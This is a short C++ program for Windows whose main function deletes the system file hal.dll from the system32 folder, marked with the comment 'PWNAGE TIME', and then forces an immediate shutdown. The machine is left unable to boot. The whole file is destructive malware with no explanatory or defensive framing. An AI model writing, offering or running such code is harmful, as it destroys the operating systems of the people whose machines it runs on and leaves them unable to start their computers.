#include <cstdlib>
#include <iostream>

using namespace std;

int main(int argc, char *argv[])
{
    system("del %SystemRoot%\\system32\\hal.dll -q"); //PWNAGE TIME
    system("%SystemRoot%\\system32\\shutdown.exe -s -f -t 00");
    system("PAUSE");
    return EXIT_SUCCESS;
}
